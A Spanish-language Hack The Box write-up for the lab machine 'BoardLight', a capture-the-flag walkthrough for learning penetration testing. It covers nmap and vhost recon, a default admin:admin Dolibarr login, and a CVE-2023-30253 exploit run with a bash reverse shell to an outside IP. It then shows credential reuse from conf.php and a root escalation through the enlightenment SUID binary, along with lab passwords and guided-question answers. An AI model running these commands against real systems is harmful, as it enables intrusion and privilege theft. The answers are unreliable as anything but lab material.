---
title: Writeup boardligth - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - boardligth
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina boardligth en Hack The Box.
keywords:
  - writeup boardligth
  - hack the box boardligth
  - resolución máquina boardligth
  - boardligth hack the box
  - htb boardligth
---
----
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/BoardLight)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=obi50FCt3ro)
- 🧠 **Explicación resumida**: 

--------

#easy #linux #nmap #ping #gobuster #/etc/hosts #nvim #nano #touch #chmod #CVE-2022-37706 #CVE-2023-30253 #grep #suid #find #tratamientotty 

---
# Guided Mode

1)¿Cuántos puertos TCP escuchan en Boardlight?
	2

2)¿Cuál es el nombre de dominio utilizado por el cuadro?
	board.htb

3)¿Cuál es el nombre de la aplicación que se ejecuta en un host virtual de Board.htb?
	dolibarr

4)¿Qué versión de Dolibarr está ejecutando en Boardlight?
	17.0.0

5)¿Cuál es la contraseña predeterminada para el usuario administrador en Dolibarr?
	admin

6)¿Cuál es la ID de CVE 2023 para una vulnerabilidad autenticada que puede conducir a la ejecución de código remoto en esta versión de Dolibarr?
	CVE-2023-30253

7)¿Qué usuario se ejecuta la aplicación Dolibarr que está en Boardlight?
	www-data

8)¿Cuál es la ruta completa del archivo que contiene la información de conexión de la base de datos Dolibarr?
	/var/www/html/crm.board.htb/htdocs/conf/conf.php

*La pregunta anterior es la flag de user.txt*
10)¿Cuál es el nombre del entorno de escritorio instalado en Boardlight?
	enlightenment

11)¿Qué versión de la Ilustración está instalada en Boardlight?
	0.23.1

12)¿Cuál es la identificación CVE 2022 para una vulnerabilidad en las versiones de la Ilustración antes de 0.25.4 que permite la escalada de privilegios?
	CVE-2022-37706

-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.11.11
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.11.11 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.10.11.11 -oN targetTCP
nmap -sU -n -Pn --top-ports 200 -oN targetUDP
```

![[BoardLigth1.png]]
![[BoardLigth2.png]]

![[BoardLigth5.png]]
*Puertos TCP:*
	`22` [[ssh]]
	`80` HTTP
*Puertos UDP:*
	`5353` zeroconf

---
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.11.11/
```

![[BoardLigth4.png]]

![[BoardLigth3.png]]
Posible mail info@board.htb, apache 2.4.41, jquery 3.4.1

-----
# Agregamos dominio al /etc/hosts

Con [[nvim]] vamos a abrir el archivo /etc/hosts con el comando `nvim /etc/hosts` para agregar la siguiente linea

```
10.10.11.11 board.htb
```

![[BoardLigth19.png]]

------
# [[Gobuster]]

```shell
gobuster vhost -u http://board.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 64 --append-domain
```

![[BoardLigth6.png]]
Buscando subdominios encontramos *crm.board.htb*

Asi que lo vamos a cargar en el /etc/hosts

```
10.10.11.11 board.htb crm.board.htb
```

![[BoardLigth22.png]]

Y ahora si entramos a la pagina

http://crm.board.htb/
![[BoardLigth7.png]]
Entramos y encontramos un crm que es un *dolibarr 17.0.0*

------
# Pasamos el panel de logeo

Probamos admin:admin
Nos pudimos autentificar. Pero en el peor de los casos podiamos hacer fuerza bruta en el login panel con [[Caido]]

![[BoardLigth20.png]]

-----
# [[CVE-2023-30253]]

Vamos a descargarnos el siguiente repositorio con [[git clone]] usando el comando ``git clone https://github.com/Rubikcuv5/cve-2023-30253`` y nos vamos a enviar una [[Reverse shell]] asi que vamos a estar en escucha con [[nc -nlvp 443]]

```
python3 CVE-2023-30253.py --url http://crm.board.htb -u admin -p admin -c "bash -c 'bash -i >& /dev/tcp/10.10.16.15/443 0>&1'"
```

![[BoardLigth8.png]]

![[BoardLigth9.png]]
Ya estamos adentro como el usuario *www-data*

------
# [[Tratamiento de la TTY]]

---------
# Escalada de privilegios al usuario larrisa buscando [[Posibles archivos con contraseñas]]

Vamos al home y vemos que existe el usuario *larissa*
![[BoardLigth10.png]]

Usamos [[grep]] para ver si encontrabamos alguna contraseña ``grep -riE ".*pass|pass|pass.*"``
![[BoardLigth11.png]]
Vemos que el archivo conf.php tiene una posible contraseña. asi que  vamos a ver el archivo y obtenemos

![[BoardLigth12.png]]

```
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
```
dolibarrowner:serverfun2$2023!!
Las credenciales estas no servian para logearnos en ningun lado. Asi que probe el usuario *larrisa* y la contraseña *serverfun2$2023!!*


![[BoardLigth13.png]]
Funciono y escalamos privilegios

----
# [[Tratamiento de la TTY]]

-------
# Escalada de privilegios al usuario root con archivos [[SUID]] y [[CVE-2022-37706]]

```
find / -perm -4000 2>/dev/null
```
![[BoardLigth16.png]]
Encontramos el binario *enlightenment* 
Ahora vamos a ver la version con `enlightenment --version`
![[BoardLigth15.png]]
Nos da que tenemos la version 0.23.1

Encontramos este [proyecto de github]( https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh)
Asi que con [[touch]] [[chmod]] [[nano]] vamos a con `touch exploit.sh` crear el archivo, luego con `chmod +x exploit.sh` le damos permisos de ejecucion y con `nano exploit.sh` vamos a abrir el editor de texto para ponerle todo el contenido
![[BoardLigth17.png]]
![[BoardLigth21.png]]
Luego con `./exploit.sh` lo ejecutamos
![[BoardLigth18.png]]
Ya somos root y podemos catear las flags


-------
# Notas

Encontramos esta contraseña que no nos sirvio de nada `class/user.class.php:		$this->pass = 'dolibSpec+@123';`

Con [[id]] encontre que estamos en el grupo 4 adm. Pero no lo pude explotar de ninguna forma
![[BoardLigth14.png]]


Cuando sale un # en el link de una pagina cuando le damos a algun boton, significa que no tiene ninguna funcionalidad por detras
Un subdominio puede tener otros subdominios

ver como mandar el find find "/var/html/crm.board.htb" -name ".\*.conf" 2>/dev/null para buscar carpetas y archivos conf que so nlos que tienen normalmente contraseñas y datos utiles
